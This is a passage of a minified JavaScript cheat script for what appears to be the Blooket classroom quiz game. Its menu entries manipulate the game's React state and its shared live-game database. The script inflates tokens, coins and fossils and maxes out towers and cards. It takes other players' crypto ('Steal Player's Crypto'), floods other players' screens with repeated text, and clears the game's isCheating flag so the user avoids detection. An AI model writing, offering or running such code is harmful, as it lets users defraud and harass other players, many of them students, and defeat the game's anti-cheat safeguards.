                            path: "c/".concat(t.props.client.name),
                            val: {
                                b: t.props.client.blook,
                                p: e,
                                cr: t.state.crypto
                            }
                        })
                    }
                }, {
                    name: "Set Screen Text",
                    description: "Makes the whole screen filled with text",
                    run: function() {
                        var e = window.prompt("Enter the text you want to display:");
                        let t = document.createElement("iframe");
                        document.body.append(t), window.prompt = t.contentWindow.prompt.bind(window), t.remove();
                        var o = Object.values(function e(t = document.querySelector("#app")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner.stateNode,
                            a = [];
                        for (let r = 0; r < 999; r++) a.push(e);
                        o.props.liveGameController.setVal({
                            path: `c/${o.props.client.name}/cr`,
                            val: `9999999999999999999999999999999999999999999999${a.join(" ")}`
                        })
                    }
                }, {
                    name: "Steal Player's Crypto",
                    description: "Steals all of someone's crypto",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let t = prompt("Who's crypto would you like to steal?"),
                            o = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        o.props.liveGameController.getDatabaseVal("c", e => {
                            var a, r;
                            e && Object.keys(e).map(e => e.toLowerCase()).includes(t.toLowerCase()) && ([a, {
                                cr: r
                            }] = Object.entries(e).find(([e]) => e.toLowerCase() == t.toLowerCase()), console.log(!!e, e, a, r, o.state), o.setState({
                                crypto: o.state.crypto + r,
                                crypto2: o.state.crypto + r
                            }), o.props.liveGameController.setVal({
                                path: "c/".concat(o.props.client.name),
                                val: {
                                    b: o.props.client.blook,
                                    p: o.state.password,
                                    cr: o.state.crypto + r,
                                    tat: a + ":" + r
                                }
                            }), console.log("done"))
                        })
                    }
                }, {
                    name: "Send Ad Text",
                    description: "Sends a load of text to another player (This will override your blook!)",
                    run: async function() {
                        var player = window.prompt("Enter the player's name:");
                        var blook = window.prompt("Enter the text to send:");

                        let t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.props.liveGameController.getDatabaseVal("c", a => {
                            var o;
                            if (a && Object.keys(a).map(e => e.toLowerCase()).includes(player.toLowerCase())) {
                                [a, {
                                    cr: o
                                }] = Object.entries(a).find(([t]) => t.toLowerCase() == player.toLowerCase());
                                t.setState({
                                    crypto: t.state.crypto + o,
                                    crypto2: t.state.crypto + o
                                });
                                t.props.liveGameController.setVal({
                                    path: "c/".concat(t.props.client.name),
                                    val: {
                                        b: t.props.client.blook,
                                        p: t.state.password,
                                        cr: t.state.crypto + o,
                                        tat: a + ":" + o
                                    }
                                });
                            }
                        });

                        let {
                            props: t2
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner.stateNode;

                        let repeatedText = `Dog:${Array(500).fill(blook).join(' ')}`;
                        t2.client.blook = repeatedText;
                        t2.liveGameController.setVal({
                            path: `c/${t2.client.name}/b`,
                            val: repeatedText
                        });
                    }
                }],
                defense: [{
                    name: "Earthquake",
                    description: "Shuffles around towers",
                    run: function() {
                        let e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode,
                            t = (e.setState({
                                eventName: "Earthquake",
                                event: {
                                    short: "e",
                                    color: "#805500",
                                    icon: "fas fa-mountain",
                                    desc: "All of your towers get mixed up",
                                    rate: .02
                                },
                                buyTowerName: "",
                                buyTower: {}
                            }, () => e.eventTimeout = setTimeout(() => e.setState({
                                event: {},
                                eventName: ""
                            }), 6e3)), e.tiles.forEach(e => e.forEach((t, o) => 3 === t && (e[o] = 0))), e.tiles.flatMap((e, t) => e.map((e, o) => 0 === e && {
                                x: o,
                                y: t
                            })).filter(Boolean).sort(() => .5 - Math.random()));
                        e.towers.forEach(o => {
                            var {
                                x: a,
                                y: r
                            } = t.shift();
                            o.move(a, r, e.tileSize), e.tiles[r][a] = 3
                        })
                    }
                }, {
                    name: "Max Tower Stats",
                    description: "Makes all placed towers overpowered",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.towers.forEach(e => {
                            e.range = 100, e.fullCd = e.cd = 0, e.damage = 1e6
                        })
                    }
                }, {
                    name: "Remove Ducks",
                    description: "Removes ducks",
                    run: function() {
                        let {
                            ducks: e,
                            tiles: t
                        } = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.forEach(e => {
                            t[e.y][e.x] = 0
                        }), e.length = 0
                    }
                }, {
                    name: "Remove Enemies",
                    description: "Removes all the enemies",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.enemies = e.futureEnemies = []
                    }
                }, {
                    name: "Remove Obstacles",
                    description: "Lets you place towers anywhere",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.tiles = e.tiles.map(e => e.fill(0))
                    }
                }, {
                    name: "Set Damage",
                    description: "Sets damage",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.dmg = Number(parseInt(prompt("How much dmg would you like?")))
                    }
                }, {
                    name: "Set Round",
                    description: "Sets the current round",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            round: Number(parseInt(prompt("What round do you want to set to?")))
                        })
                    }
                }, {
                    name: "Set Tokens",
                    description: "Sets the amount of tokens you have",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            tokens: Number(parseInt(prompt("How many tokens would you like?")))
                        })
                    }
                }],
                defense2: [{
                    name: "Max Tower Stats",
                    description: "Makes all placed towers overpowered",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.state.towers.forEach(e => {
                            if (e.stats.dmg = 1e6, e.stats.fireRate = 50, e.stats.ghostDetect = !0, e.stats.maxTargets = 1e6, e.stats.numProjectiles &&= 100, e.stats.range = 100, e.stats.auraBuffs)
                                for (let t in e.stats.auraBuffs) e.stats.auraBuffs[t] *= 100
                        })
                    }
                }, {
                    name: "Kill Enemies",
                    description: "Kills all the enemies",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.state.game.scene.enemyQueue.length = 0, e.state.game.scene.physics.world.bodies.entries.forEach(e => e?.gameObject?.receiveDamage?.(e.gameObject.hp, 1))
                    }
                }, {
                    name: "Set Coins",
                    description: "Sets coins",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            coins: Number(parseInt(prompt("How many tokens would you like?")))
                        })
                    }
                }, {
                    name: "Set Health",
                    description: "Sets the amount of health you have",
                    run: function(e) {
                        var t = document.createElement("iframe");
                        document.body.append(t), window.prompt = t.contentWindow.prompt.bind(window), t.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            health: Number(parseInt(prompt("How much health do you want?")))
                        })
                    }
                }, {
                    name: "Set Round",
                    description: "Sets the current round",
                    run: function(e) {
                        var t = document.createElement("iframe");
                        document.body.append(t), window.prompt = t.contentWindow.prompt.bind(window), t.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            round: Number(parseInt(prompt("What round do you want to set to?")))
                        })
                    }
                }],
                dinos: [{
                    name: "Auto Choose",
                    description: "Automatically choose the best fossil when excavating",
                    type: "toggle",
                    enabled: false,
                    data: null,
                    run: function() {
                        if (this.enabled) {
                            this.enabled = false;
                            clearInterval(this.data);
                            this.data = null;
                        } else {
                            this.enabled = true;
                            this.data = setInterval(() => {
                                const cheat = (async () => {
                                    function rand(e, t) {
                                        const s = [];
                                        while (s.length < t) {
                                            const i = Math.random();
                                            let r = 0,
                                                g = null;
                                            for (let o = 0; o < e.length; o++) {
                                                r += e[o].rate;
                                                if (r >= i) {
                                                    g = e[o];
                                                    break;
                                                }
                                            }
                                            g && !s.includes(g) && s.push(g);
                                        }
                                        return s;
                                    }

                                    try {
                                        let {
                                            stateNode
                                        } = Object.values((function react(r = document.querySelector("body>div")) {
                                            return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                                        })())[1].children[0]._owner;

                                        if (stateNode.state.stage === "excavate") {
                                            stateNode.state.choices.length || (stateNode.state.choices = rand([{
                                                    type: "fossil",
                                                    val: 10,
                                                    rate: .1,
                                                    blook: "Amber"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 25,
                                                    rate: .1,
                                                    blook: "Dino Egg"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 50,
                                                    rate: .175,
                                                    blook: "Dino Fossil"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 75,
                                                    rate: .175,
                                                    blook: "Stegosaurus"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 100,
                                                    rate: .15,
                                                    blook: "Velociraptor"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 125,
                                                    rate: .125,
                                                    blook: "Brontosaurus"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 250,
                                                    rate: .075,
                                                    blook: "Triceratops"
                                                },
                                                {
                                                    type: "fossil",
                                                    val: 500,
                                                    rate: .025,
                                                    blook: "Tyrannosaurus Rex"
                                                },
                                                {
                                                    type: "mult",
                                                    val: 1.5,
                                                    rate: .05
                                                },
                                                {
                                                    type: "mult",
                                                    val: 2,
                                                    rate: .025
                                                }
                                            ], 3));

                                            let max = 0,
                                                index = -1;
                                            for (let i = 0; i < stateNode.state.choices.length; i++) {
                                                const {
                                                    type,
                                                    val
                                                } = stateNode.state.choices[i];
                                                const value = (type == "fossil" ? stateNode.state.fossils + val * stateNode.state.fossilMult : stateNode.state.fossils * val) || 0;
                                                if (value <= max && type != "mult") continue;
                                                max = value;
                                                index = i + 1;
                                            }

                                            document.querySelector('div[class*=rockRow] > div[role="button"]:nth-child(' + index + ')').click();
                                        }
                                    } catch {}
                                });
                                cheat();
                            }, 50);
                        }
                    }
                }, {
                    name: "Rock ESP",
                    description: "Shows what is under the rocks",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        let e = ["⁰", "\xb9", "\xb2", "\xb3", "⁴", "⁵", "⁶", "⁷", "⁸", "⁹"],
                            t = t => {
                                let a = "";
                                for (; t > 0;) a = e[t % parseInt("10")] + a, t = ~~(t / 10);
                                return a
                            },
                            a = e => {
                                let a = e.toString();
                                if (e >= 1e3) {
                                    let o = ["", "K", "M", "B", "T"],
                                        r = ~~((digits(e) - 1) / 3);
                                    if (r < o.length) {
                                        let i = "";
                                        for (let n = 3; n >= 1; n--) {
                                            i = parseFloat((0 !== r ? e / 1e3 ** r : e).toPrecision(n)).toString();
                                            let s = i.replace(/[^a-zA-Z 0-9]+/g, "");
                                            if (s.length <= 3) break
                                        }
                                        Number(i) % 1 != 0 && (i = Number(i).toFixed(1)), a = i + o[r]
                                    } else {
                                        let l = e,
                                            c = 0;
                                        for (; l >= 100;) l = Math.floor(l / 10), c += 1;
                                        a = `${l/10} \xd7 10${t(c+1)}`
                                    }
                                }
                                return a
                            };
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            let {
                                stateNode: e
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner, t = [...document.querySelector('[class*="rockButton"]').parentElement.children];
                            t.every(e => e.querySelector("div")) || e.setState({
                                choices: [{
                                    type: "fossil",
                                    val: 10,
                                    rate: .1,
                                    blook: "Amber"
                                }, {
                                    type: "fossil",
                                    val: 25,
                                    rate: .1,
                                    blook: "Dino Egg"
                                }, {
                                    type: "fossil",
                                    val: 50,
                                    rate: .175,
                                    blook: "Dino Fossil"
                                }, {
                                    type: "fossil",
                                    val: 75,
                                    rate: .175,
                                    blook: "Stegosaurus"
                                }, {
                                    type: "fossil",
                                    val: 100,
                                    rate: .15,
                                    blook: "Velociraptor"
                                }, {
                                    type: "fossil",
                                    val: 125,
                                    rate: .125,
                                    blook: "Brontosaurus"
                                }, {
                                    type: "fossil",
                                    val: 250,
                                    rate: .075,
                                    blook: "Triceratops"
                                }, {
                                    type: "fossil",
                                    val: 500,
                                    rate: .025,
                                    blook: "Tyrannosaurus Rex"
                                }, {
                                    type: "mult",
                                    val: 1.5,
                                    rate: .05
                                }, {
                                    type: "mult",
                                    val: 2,
                                    rate: .025
                                }].sort(() => .5 - Math.random()).slice(0, 3)
                            }, () => {
                                t.forEach((t, o) => {
                                    let r = e.state.choices[o];
                                    t.querySelector("div") && t.querySelector("div").remove();
                                    let i = document.createElement("div");
                                    i.style.color = "white", i.style.fontFamily = "Macondo", i.style.fontSize = "1em", i.style.display = "flex", i.style.justifyContent = "center", i.style.transform = "translateY(25px)", i.innerText = "fossil" === r.type ? `+${Math.round(r.val*e.state.fossilMult)>99999999?a(Math.round(r.val*e.state.fossilMult)):Math.round(r.val*e.state.fossilMult)} Fossils` : `x${r.val} Fossils Per Excavation`, t.append(i)
                                })
                            })
                        }, 50))
                    }
                }, {
                    name: "Set Fossils",
                    description: "Sets the amount of fossils you have",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("How many fossils would you like?")))),
                            t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        t.setState({
                            fossils: e
                        }), t.props.liveGameController.setVal({
                            path: "c/" + t.props.client.name,
                            val: {
                                b: t.props.client.blook,
                                f: e,
                                ic: t.state.isCheating
                            }
                        })
                    }
                }, {
                    name: "Set Multiplier",
                    description: "Sets fossil multiplier",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove(), Number(parseInt(prompt("What do you want your multiplier to be?"))));
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            fossilMult: e
                        })
                    }
                }, {
                    name: "Stop Cheating",
                    description: "Undoes cheating so that you can't be caught",
                    run: function() {
                        var e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        e.setState({
                            isCheating: !1
                        }), e.props.liveGameController.setVal({
                            path: `c/${e.props.client.name}/ic`,
                            val: !1
                        })
                    }
                }],
                doom: [{
                    name: "Fill Deck",
                    description: "Fills your deck with every maxed out card and artifact (Only works on towers page)",
                    run: function() {
                        let e = document.createElement("iframe");
                        if (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), "/tower/map" == window.location.pathname) {
                            let {
                                stateNode: t
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                            t.props.tower.artifacts = "Medical Kit|Fury Relic|Survival Guide|Steel Socks|Piggy Bank|Lucky Feather|Coupon|Cheese|Tasty Egg|Training Weights|Mighty Shield|Toxic Waste|Lifeline Totem|Cursed Hourglass|Band-Aid|Elder Coins|Captain's Anchor|Chess Pieces|Pink Hippo|Anorak's Wizard Cap|Dave's Doggo|Anubis' Obelisk|Farm Tractor|Magic Seedling|Just A Bone|Cozy Igloo|King's Crown|Sacred Scroll".split("|"), t.props.tower.cards = "Chick,\uD83C\uDF3D|Chicken,\uD83C\uDF3D|Cow,\uD83C\uDF3D|Goat,\uD83C\uDF3D|Horse,\uD83C\uDF3D|Pig,\uD83C\uDF3D|Sheep,\uD83C\uDF3D|Duck,\uD83C\uDF3D|Dog,\uD83C\uDF3D|Cat,\uD83D\uDC3E|Rabbit,\uD83D\uDC3E|Goldfish,\uD83D\uDC3E|Hamster,\uD83D\uDC3E|Turtle,\uD83D\uDC3E|Kitten,\uD83D\uDC3E|Puppy,\uD83D\uDC3E|Bear,\uD83C\uDF32|Moose,\uD83C\uDF32|Fox,\uD83C\uDF32|Raccoon,\uD83C\uDF32|Squirrel,\uD83C\uDF32|Owl,\uD83C\uDF32|Hedgehog,\uD83C\uDF32|Baby Penguin,❄️|Penguin,❄️|Arctic Fox,❄️|Snowy Owl,❄️|Polar Bear,❄️|Arctic Hare,❄️|Seal,❄️|Walrus,❄️|Tiger,\uD83C\uDF34|Panther,\uD83C\uDF34|Cockatoo,\uD83C\uDF34|Orangutan,\uD83C\uDF34|Anaconda,\uD83C\uDF34|Macaw,\uD83C\uDF34|Jaguar,\uD83C\uDF34|Capuchin,\uD83C\uDF34|Toucan,\uD83C\uDF34|Parrot,\uD83C\uDF34|Elf,⚔️|Witch,⚔️|Wizard,⚔️|Fairy,⚔️|Slime Monster,⚔️|Jester,⚔️|Dragon,⚔️|Unicorn,⚔️|Queen,⚔️|King,⚔️|Snow Globe,☃️|Holiday Gift,☃️|Hot Chocolate,☃️|Gingerbread Man,☃️|Gingerbread House,☃️|Holiday Wreath,☃️|Snowman,☃️|Santa Claus,☃️|Two of Spades,\uD83C\uDFF0|Eat Me,\uD83C\uDFF0|Drink Me,\uD83C\uDFF0|Alice,\uD83C\uDFF0|Queen of Hearts,\uD83C\uDFF0|Dormouse,\uD83C\uDFF0|White Rabbit,\uD83C\uDFF0|Cheshire Cat,\uD83C\uDFF0|Caterpillar,\uD83C\uDFF0|Mad Hatter,\uD83C\uDFF0|King of Hearts,\uD83C\uDFF0".split("|").map(e => {
                                let [t, o] = e.split(",");
                                return {
                                    strength: 20,
                                    charisma: 20,
                                    wisdom: 20,
                                    class: o,
                                    blook: t
                                }
                            });
                            try {
                                t.props.addTowerNode()
                            } catch {}
                            t.setState({
                                showDeck: !1
                            })
                        } else alert("You need to be on the map to run this cheat!")
                    }
                }, {
                    name: "Max Cards",
                    description: "Maxes out all the cards in your deck",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), "/tower/map" == window.location.pathname ? (e = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode).props.tower.cards.forEach(e => {
                            e.strength = 20, e.charisma = 20, e.wisdom = 20
                        }) : alert("You need to be on the map to run this cheat!")
                    }
                }, {
                    name: "Max Health",
                    description: "Fills the player's health",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), "/tower/battle" == window.location.pathname ? Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            myHealth: 100
                        }) : alert("You need to be in battle to run this cheat!")
                    }
                }, {
                    name: "Max Card Stats",
                    description: "Maxes out player's current card (Only works on attribute select page)",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner).stateNode;
                        "select" !== e.state.phase ? alert("You must be on the attribute selection page!") : e.setState({
                            myCard: {
                                ...e.state.myCard,
                                strength: 20,
                                charisma: 20,
                                wisdom: 20
                            }
                        })
                    }
                }, {
                    name: "Min Enemy Stats",
                    description: "Makes the enemy card stats all 0 (Only works on attribute select page)",
                    run: function() {
                        var e = document.createElement("iframe"),
                            e = (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner).stateNode;
                        "select" !== e.state.phase ? alert("You must be on the attribute selection page!") : e.setState({
                            enemyCard: {
                                ...e.state.enemyCard,
                                strength: 0,
                                charisma: 0,
                                wisdom: 0
                            }
                        })
                    }
                }, {
                    name: "Set Coins",
                    description: "Try's to set amount of tower coins you have",
                    run: function() {
                        var e = document.createElement("iframe");
                        if (document.body.append(e), window.alert = e.contentWindow.prompt.bind(window), e.remove(), "/tower/battle" == window.location.pathname) {
                            var e = parseInt("0" + alert("How many coins would you like?")),
                                t = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                            try {
                                t.props.setTowerCoins(e)
                            } catch {}
                        } else alert("You need to be in battle to run this cheat!")
                    }
                }],
                factory: [{
                    name: "Choose Blook",
                    description: "Gives you a blook",
                    run: function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        let {
                            stateNode: t
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner, o = [{
                            name: "Chick",
                            color: "#ffcd05",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [3, 7, 65, 400, 2500],
                            time: [1, 1, 1, 1, 1],
                            price: [300, 3e3, 3e4, 2e5]
                        }, {
                            name: "Chicken",
                            color: "#ed1c24",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [10, 40, 200, 1400, 1e4],
                            time: [5, 4, 3, 2, 1],
                            price: [570, 4e3, 5e4, 8e5]
                        }, {
                            name: "Cow",
                            color: "#58595b",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [25, 75, 1500, 25e3, 25e4],
                            time: [15, 10, 10, 10, 5],
                            price: [500, 9500, 16e4, 4e6]
                        }, {
                            name: "Duck",
                            color: "#4ab96d",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [4, 24, 200, 3e3, 4e4],
                            time: [3, 3, 3, 3, 3],
                            price: [450, 4200, 7e4, 11e5]
                        }, {
                            name: "Goat",
                            color: "#c59a74",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [5, 28, 200, 1300, 12e3],
                            time: [3, 3, 2, 2, 2],
                            price: [500, 6400, 45e3, 5e5]
                        }, {
                            name: "Horse",
                            color: "#995b3c",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [5, 20, 270, 1800, 15e3],
                            time: [2, 2, 2, 2, 2],
                            price: [550, 8200, 65e3, 6e5]
                        }, {
                            name: "Pig",
                            color: "#f6a9cb",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [20, 50, 1300, 8e3, 8e4],
                            time: [7, 7, 7, 7, 5],
                            price: [400, 11e3, 8e4, 13e5]
                        }, {
                            name: "Sheep",
                            color: "#414042",
                            class: "\uD83C\uDF3D",
                            rarity: "Common",
                            cash: [6, 25, 250, 1500, 11e3],
                            time: [3, 3, 3, 2, 2],
                            price: [500, 5e3, 5e4, 43e4]
                        }, {
                            name: "Cat",
                            color: "#f49849",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [5, 18, 170, 1700, 13e3],
                            time: [2, 2, 2, 2, 2],
                            price: [480, 5500, 6e4, 5e5]
                        }, {
                            name: "Dog",
                            color: "#995b3c",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [7, 25, 220, 1900, 9e3],
                            time: [3, 3, 2, 2, 1],
                            price: [460, 6600, 7e4, 73e4]
                        }, {
                            name: "Goldfish",
                            color: "#f18221",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [5, 40, 350, 3500, 35e3],
                            time: [3, 3, 3, 3, 3],
                            price: [750, 7200, 84e3, 95e4]
                        }, {
                            name: "Rabbit",
                            color: "#e7bf9a",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [3, 18, 185, 800, 7e3],
                            time: [2, 2, 2, 1, 1],
                            price: [500, 5800, 56e3, 55e4]
                        }, {
                            name: "Hamster",
                            color: "#ce9176",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [10, 45, 450, 4500, 45e3],
                            time: [4, 4, 4, 4, 4],
                            price: [650, 6500, 8e4, 93e4]
                        }, {
                            name: "Turtle",
                            color: "#619a3c",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [23, 120, 1400, 15e3, 17e4],
                            time: [10, 10, 10, 10, 10],
                            price: [700, 8500, 11e4, 13e5]
                        }, {
                            name: "Puppy",
                            color: "#414042",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [4, 10, 75, 500, 3e3],
                            time: [1, 1, 1, 1, 1],
                            price: [450, 4e3, 35e3, 25e4]
                        }, {
                            name: "Kitten",
                            color: "#58595b",
                            class: "\uD83D\uDC3E",
                            rarity: "Common",
                            cash: [4, 8, 60, 400, 2e3],
                            time: [1, 1, 1, 1, 1],
                            price: [350, 3500, 26e3, 17e4]
                        }, {
                            name: "Bear",
                            color: "#995b3c",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [12, 70, 550, 4500, 1e5],
                            time: [7, 7, 6, 5, 5],
                            price: [550, 5500, 63e3, 16e5]
                        }, {
                            name: "Moose",
                            color: "#995b3c",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [8, 45, 400, 3500, 26e3],
                            time: [5, 5, 4, 4, 3],
                            price: [520, 6500, 58e3, 7e5]
                        }, {
                            name: "Fox",
                            color: "#f49849",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [7, 15, 80, 550, 3e3],
                            time: [2, 2, 1, 1, 1],
                            price: [400, 4e3, 36e3, 24e4]
                        }, {
                            name: "Raccoon",
                            color: "#6d6e71",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [5, 14, 185, 1900, 19e3],
                            time: [2, 2, 2, 2, 2],
                            price: [400, 5e3, 71e3, 8e5]
                        }, {
                            name: "Squirrel",
                            color: "#d25927",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [3, 10, 65, 470, 2600],
                            time: [1, 1, 1, 1, 1],
                            price: [420, 3600, 32e3, 21e4]
                        }, {
                            name: "Owl",
                            color: "#594a42",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [4, 17, 155, 1500, 15e3],
                            time: [2, 2, 2, 2, 2],
                            price: [500, 4800, 55e3, 58e4]
                        }, {
                            name: "Hedgehog",
                            color: "#3f312b",
                            class: "\uD83C\uDF32",
                            rarity: "Common",
                            cash: [11, 37, 340, 2200, 3e4],
                            time: [5, 4, 3, 2, 2],
                            price: [540, 7e3, 77e3, 12e5]
                        }, {
                            name: "Seal",
                            color: "#7ca1d5",
                            class: "❄️",
                            rarity: "Common",
                            cash: [6, 17, 150, 1200, 13e3],
                            time: [2, 2, 2, 2, 2],
                            price: [480, 4500, 43e3, 52e4]
                        }, {
                            name: "Arctic Fox",
                            color: "#7ca1d5",
                            class: "❄️",
                            rarity: "Common",
                            cash: [5, 18, 180, 850, 8500],
                            time: [2, 2, 2, 1, 1],
                            price: [520, 550, 61e3, 68e4]
                        }, {
                            name: "Snowy Owl",
                            color: "#feda3f",
                            class: "❄️",
                            rarity: "Common",
                            cash: [5, 20, 190, 1900, 16e3],
                            time: [3, 3, 2, 2, 2],
                            price: [370, 5300, 76e3, 62e4]
                        }, {
                            name: "Arctic Hare",
                            color: "#7ca1d5",
                            class: "❄️",
                            rarity: "Common",
                            cash: [6, 19, 85, 900, 7e3],
                            time: [2, 2, 1, 1, 1],
                            price: [540, 5200, 66e3, 55e4]
                        }, {
                            name: "Penguin",
                            color: "#fb8640",
                            class: "❄️",
                            rarity: "Common",
                            cash: [4, 21, 310, 3200, 33e3],
                            time: [3, 3, 3, 3, 3],
                            price: [400, 6500, 76e3, 87e4]
                        }, {
                            name: "Baby Penguin",
                            color: "#414042",
                            class: "❄️",
                            rarity: "Common",
                            cash: [3, 8, 70, 450, 2700],
                            time: [1, 1, 1, 1, 1],
                            price: [420, 3300, 33e3, 23e4]
                        }, {
                            name: "Polar Bear",
                            color: "#7ca1d5",
                            class: "❄️",
                            rarity: "Common",
                            cash: [12, 75, 700, 6500, 85e3],
                            time: [8, 7, 6, 5, 5],
                            price: [630, 7e3, 91e3, 14e5]
                        }, {
                            name: "Walrus",
                            color: "#7d4f33",
                            class: "❄️",
                            rarity: "Common",
                            cash: [11, 46, 420, 3700, 51e3],
                            time: [5, 5, 4, 4, 4],
                            price: [550, 6200, 68e3, 1e6]
                        }, {
                            name: "Tiger",
                            color: "#f18221",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [6, 20, 100, 975, 7500],
                            time: [3, 3, 1, 1, 1],
                            price: [390, 6e3, 7e4, 61e4]
                        }, {
                            name: "Jaguar",
                            color: "#fbb040",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [8, 28, 230, 1600, 17e3],
                            time: [3, 3, 2, 2, 2],
                            price: [390, 6e3, 7e4, 61e4]
                        }, {
                            name: "Toucan",
                            color: "#ffca34",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [9, 20, 175, 625, 3800],
                            time: [2, 2, 2, 1, 1],
                            price: [520, 4800, 42e3, 3e5]
                        }, {
                            name: "Cockatoo",
                            color: "#7ca1d5",
                            class: "\uD83C\uDF34",
                            rarity: "Common",
                            cash: [6, 35, 160, 1700, 18e3],
                            time: [4, 4, 2, 2, 2],
                            price: [500, 5e3, 63e3, 7e5]
                        }, {
                            name: "Macaw",
